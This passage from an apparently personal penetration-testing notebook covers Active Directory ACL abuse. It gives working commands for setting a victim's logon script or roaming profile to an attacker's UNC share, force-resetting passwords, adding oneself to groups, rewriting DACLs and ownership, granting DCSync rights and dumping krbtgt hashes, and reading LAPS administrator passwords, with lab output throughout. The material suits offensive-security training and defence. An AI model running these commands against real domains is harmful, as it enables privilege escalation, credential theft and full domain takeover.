- `WriteProperty` for `scriptPath` on a user object allows you to set a user's logon script to an arbitrary executable of your choice — and it will execute on the target user's behalf upon user logon. 
- Set `scriptPath` using `ActiveDirectory` PowerShell module:

```powershell
Set-ADUser -Identity targetuser -ScriptPath "\\10.10.14.5\share\exploit.bat"
```

- Set `scriptPath` attribute via PowerView:

```powershell
Set-DomainObject -Identity targetuser -Set @{scriptPath='\\10.10.14.5\share\exploit.bat'}
```

- Set `scriptPath` attribute via `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' set attribute targetuser scriptPath -v '\\10.10.14.5\share\exploit.bat'
```

>[!warning] This misconfiguration is often overlooked by tools like **BloodHound**, which may not display **`WriteProperty`** permissions on `profilePath` or `scriptPath` attributes.
#### `WriteProperty` for `profilePath` on a user object

- `WriteProperty` for `profilePath` on a user object allows you to **redirect the user's roaming profile to a UNC path of your control** to intercept the profile loading process (the target authenticates to your host, which you can capture or relay). 

- Set `profilePath` via PowerView:

```powershell
Set-DomainObject -Identity targetuser -Set @{profilepath='\\10.10.14.5\share'}
```

>[!warning] This misconfiguration is often overlooked by tools like **BloodHound**, which may not display **`WriteProperty`** permissions on `profilePath` or `scriptPath` attributes.
#### `WriteProperty` for `gPLink` on an OU, site, or domain object

- `WriteProperty` for `gPLink` on an OU, site, or domain object allows you to **link an existing GPO you control** to that container without editing the GPO itself. Its settings then apply to every object in the container.

- Set `gPLink` via PowerView:

```powershell
Set-DomainObject -Identity 'OU=Workstations,DC=example,DC=com' -Set @{gplink='[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=com;0]'}
```
### `GenericWrite`

>[!important] `GenericWrite` grants control over an AD object's attributes.

- **`GenericWrite`** allows you to **modify any non-protected attribute** of a target object. If `WriteProperty` allows modification of only specific attributes, `GenericWrite` gives you **full control over all object attributes**. It doesn't include `WriteDACL` or `WriteOwner`.
- Exploitation is therefore similar to specific `WriteProperty` cases.
	- **`GenericWrite` on a user object** -> assign `servicePrincipalName` to subsequently perform [[Kerberoasting]] (see [[#WriteProperty for servicePrincipalName on a user or computer object]]); modify `userAccountControl` to disable Kerberos pre-authentication and subsequently perform [[AS-REP roasting]] (see [[#WriteProperty for userAccountControl on a user or computer object]]); modify `scriptPath` to achieve arbitrary code execution (see [[#WriteProperty for scriptPath on a user object]]).
	- **`GenericWrite` on a group object** -> modify the `member` attribute to add yourself to a privileged group (see [[#WriteProperty for member on a group object]]).
	- **`GenericWrite` on a computer object** -> assign `servicePrincipalName` to subsequently perform [[Kerberoasting]] (see [[#WriteProperty for servicePrincipalName on a user or computer object]]); write `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD attacks; write `msDS-KeyCredentialLink` for [[Shadow credentials]].
	- **`GenericWrite` on an OU, site, or domain object** -> modify the `gPLink` attribute to link a GPO without editing the GPO itself (see [[#WriteProperty for gPLink on an OU, site, or domain object]]).

> [!example]-
> - Check which permissions the user `damundsen` has over the group `Help Desk Level 1`:
> 
> ```powershell
> Get-DomainObjectAcl -Identity 'Help Desk Level 1' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Convert-NameToSid 'damundsen')}
> ```
> 
> ```powershell
> AceType               : AccessAllowed
> ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
> AccessMask            : 131132
> ```
> 
> - Since there is `GenericWrite`, `damundsen` can add themselves to the group:
> 
> ```powershell
> Add-ADGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $cred2
> ```
> 
> - Verify membership:
> 
> ```powershell
> Get-AdGroupMember 'Help Desk Level 1' | Select-Object SamAccountName
> ```
> 
> ```powershell
> SamAccountName
> --------------
> dpayne
> damundsen
> hispossiond
> hilowentoce
> # ...
> ```

### `ForceChangePassword` on a user object

>`ForceChangePassword` extended right grants permission to reset a user's password without supplying their current password.

>[!note] See [[#Resetting the user's password]].
#### From Linux

- To change the user's password, you can use the Samba's [`net rpc`](https://www.samba.org/samba/docs/current/man-html/net.8.html) tool:

```bash
net rpc password 'rroe' 'net_passwd123' -U 'example.com'/'jdoe%passwd123' -S 10.10.11.5 
```

>[!note]+ `net rpc password` options

| Option           | Description |
| ---------------- | ----------- |
| `-U`, `--user`   |             |
| `--password`     |             |
| `-S`, `--server` |             |
| ...              |             |


- Using `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' set password rwade 'new_passwd123'
```

- Using `rpcclient`:

```bash
rpcclient -U 'example.com/jdoe%passwd123' 10.10.11.5 -c "setuserinfo2 rwade 23 'new_passwd123'"
```


- Check credentials:

```bash
nxc ldap 10.10.11.5 -u rroe -p 'new_passwd123'
```
#### From Windows

- Use the native Windows [`net`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems) command:

```cmd
net user rwade 'new_passwd123' /domain
```

- Using  [`Set-DomainUserPassword`](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) (PowerView):

```powershell
Set-DomainUserPassword -Identity rwade -AccountPassword (ConvertTo-SecureString 'new_passwd123' -AsPlainText -Force)
```

- Using the `ActiveDirectory` PowerShell module:

```powershell
Set-ADAccountPassword -Identity rwade -Reset -NewPassword (ConvertTo-SecureString 'new_passwd123' -AsPlainText -Force )
```

>[!warning] Resetting a password immediately invalidates the user's previous password and can disrupt scheduled tasks and applications/services running under the account.


>[!example]+
> 
> - Check what permissions the user `wley` has over the user `damundsen`:
> 
> ```powershell
> Get-DomainObjectAcl -Identity 'damundsen' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Convert-NameToSid 'wley')}
> ```
> 
> ```powershell
> AceQualifier           : AccessAllowed
> ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights  : ExtendedRight
> ObjectAceType          : User-Force-Change-Password
> SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
> AccessMask             : 256
> IsInherited            : False
> ```
> 
> - Authenticate as `wley` using `PSCredential`:
> 
> ```powershell
> $sec_password = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential(
>     'INLANEFREIGHT\wley',
>     $sec_password
> )
> ```
> 
> - `$cred` is just a credential container; you pass it to commands that support `-Credential`.
> - Use [`Set-DomainUserPassword`](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) (PowerView) to set a new password:
> 
> ```powershell
> Set-DomainUserPassword -Identity damundsen -AccountPassword (ConvertTo-SecureString 'Passwd123!' -AsPlainText -Force) -Credential $cred -Verbose
> ```
> 
> ```powershell
> VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
> VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
> ```
> 
> - To check the password has been changed successfully, try an authenticated LDAP query with the new credential:
> 
> ```powershell
> $damundsen_password = ConvertTo-SecureString 'Passwd123!' -AsPlainText -Force
> $cred2 = New-Object System.Management.Automation.PSCredential(
>     'INLANEFREIGHT\damundsen',
>     $damundsen_password
> )
> 
> Get-DomainUser -Identity damundsen -Credential $cred2 | Select-Object samaccountname, serviceprincipalname
> ```
> 
> ```powershell
> samaccountname       : damundsen
> serviceprincipalname : {MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433, MSSQL/ACADEMY-EA-FILE}
> ```
### `Self` (`AddSelf`)

>[!important] `Self` (`Self-Membership` / `AddSelf`, GUID `bf9679c0-0de6-11d0-a285-00aa003049e2`) is a validated write right that allows a principal to add or remove **itself** from a group.

- Add current account to target group via PowerView:

```powershell
Add-DomainGroupMember -Identity "Helpdesk" -Members "jdoe"
```

- Add current account to target group via `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add groupMember "Helpdesk" "jdoe"
```

>[!note] Unlike `WriteProperty` on `member`, `AddSelf` lets you add **only** your own account — not an arbitrary third account.

### `AllExtendedRights`

>[!important] `AllExtendedRights` (an `ExtendedRight` ACE with no specific GUID) grants every extended right applicable to the object's class.

- Impact depends on the object class:
	- **User object** -> includes `User-Force-Change-Password` (reset the password, see [[#ForceChangePassword on a user object]]).
	- **Domain root** -> includes `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` (DCSync, see [[#DCSync rights]]).
	- **Computer with LAPS** -> includes read access to the confidential LAPS password attribute (see [[#LAPS attribute abuse]]).

### `WriteDACL`

>[!important] `WriteDACL` (`WD`) allows modifying the target object's DACL. You can grant yourself `GenericAll` or specific extended rights.

#### Overwriting the DACL via PowerView

- Grant `GenericAll` to a controlled account:

```powershell
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity jdoe -Rights All
```

- Grant DCSync rights to a controlled account on the domain object:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity jdoe -Rights DCSync
```

>[!note] `Add-DomainObjectAcl -Rights` accepts `All`, `ResetPassword`, `WriteMembers`, and `DCSync`, or a manual `-RightsGUID`.

#### Overwriting the DACL via `dsacls` (Windows)

- Grant `GenericAll` to a controlled account:

```cmd
dsacls "CN=Target User,CN=Users,DC=example,DC=com" /G "EXAMPLE\jdoe:GA"
```

#### Overwriting the DACL via Linux tools

- Grant `GenericAll` using `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add genericAll targetuser jdoe
```

- Grant `GenericAll` using `dacledit.py`:

```bash
dacledit.py -action write -rights FullControl -principal jdoe -target targetuser -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- Grant DCSync rights on the domain using `dacledit.py`:

```bash
dacledit.py -action write -rights DCSync -principal jdoe -target-dn "DC=example,DC=com" -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

### `WriteOwner`

>[!important] `WriteOwner` (`WO`) permits changing the target object's owner to an attacker-controlled account. Because an object's owner implicitly holds `WRITE_DAC`, taking ownership allows rewriting the DACL even if direct access was restricted.

#### Taking ownership via PowerView

- Take ownership of the target object:

```powershell
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity jdoe
```

- Grant explicit `GenericAll` rights after acquiring ownership:

```powershell
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity jdoe -Rights All
```

#### Taking ownership via Linux tools

- Take ownership using Impacket's `owneredit.py`:

```bash
owneredit.py -action write -new-owner jdoe -target targetuser -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- Take ownership using `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' set owner targetuser jdoe
```

>[!note] After taking ownership, grant yourself rights ([[#WriteDACL]]), then perform the abuse.

### DCSync rights

>[!important] DCSync requires two domain-level extended rights: `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`).

- Check if an account holds the replication rights via PowerView:

```powershell
Get-DomainObjectAcl -SearchBase "DC=example,DC=com" -ResolveGUIDs | Where-Object { ($_.ObjectAceType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') -or ($_.ObjectAceType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') }
```

- With `WriteDacl` / `WriteOwner` on the domain root, grant yourself the replication rights:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity jdoe -Rights DCSync
```

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add dcsync jdoe
```

- Then run the DCSync attack:

```bash
secretsdump.py -just-dc-user krbtgt example.com/jdoe:'passwd123'@10.10.11.5
```

>[!note] The DCSync attack, its tooling (`secretsdump.py`, Mimikatz, `Invoke-DCSync`), and the replication protocol are covered in [[DCSync]].

### LAPS attribute abuse

>[!important] Legacy LAPS stores local administrator passwords in `ms-Mcs-AdmPwd`. Windows LAPS stores them in `msLAPS-Password` (or `msLAPS-EncryptedPassword` when encryption is enabled). Both are confidential attributes: reading them requires `AllExtendedRights`, `GenericAll`, or explicit read access granted on the attribute.

- Read the legacy LAPS password via PowerView:

```powershell
Get-DomainComputer -Properties ms-Mcs-AdmPwd, name | Where-Object { $_.'ms-mcs-admpwd' }
```

- Read LAPS passwords via NetExec (covers legacy and Windows LAPS):

```bash
nxc ldap 10.10.11.5 -u jdoe -p 'passwd123' -M laps
```

- Read the legacy LAPS password via `ldapsearch`:

```bash
ldapsearch -x -H ldap://10.10.11.5 -D "jdoe@example.com" -w 'passwd123' -b "DC=example,DC=com" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

- Read the LAPS attribute of a specific host via `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' get object 'TARGET$' --attr ms-Mcs-AdmPwd
```

## References and further reading

- [`ACL Abuse — HackersManifest`](https://hackersmanifest.com/ad-attack-paths/03-acl-abuse/)
- [`Abusing Active Directory ACLs/ACEs — HackTricks`](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)
- [`DACL abuse — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/dacl/)
- [`An ACE Up the Sleeve — SpecterOps`](https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf)
- [`An In-Depth Access Control List (ACL) Guide — SpecterOps`](https://posts.specterops.io/an-in-depth-access-control-list-acl-guide-8ba5381a1795)
- [`bloodyAD — GitHub`](https://github.com/CravateRouge/bloodyAD)
